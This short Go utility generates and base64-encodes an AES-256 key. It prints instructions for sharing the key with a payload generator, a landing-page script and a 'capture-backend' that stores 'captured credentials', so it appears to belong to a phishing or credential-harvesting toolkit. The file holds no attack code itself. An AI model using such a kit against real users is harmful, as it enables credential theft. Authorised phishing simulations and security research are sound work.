//go:build ignore
// +build ignore

// keygen — generate the AES-256 encryption key shared between
// payload-generator and the landing page JavaScript.
// Usage: go run keygen.go

package main

import (
	"crypto/rand"
	"encoding/base64"
	"fmt"
)

func main() {
	key := make([]byte, 32) // AES-256
	if _, err := rand.Read(key); err != nil {
		panic(fmt.Sprintf("crypto/rand failed: %v", err))
	}
	encoded := base64.StdEncoding.EncodeToString(key)
	fmt.Println(encoded)
	fmt.Println()
	fmt.Println("Add this to:")
	fmt.Println("  1. payload-generator: --key " + encoded)
	fmt.Println("  2. landing page JavaScript: const AES_KEY_B64 = '" + encoded + "';")
	fmt.Println("  3. capture-backend: STORAGE_KEY=" + encoded)
	fmt.Println()
	fmt.Println("⚠️  Keep this key secret. Anyone with it can decrypt captured credentials.")
}
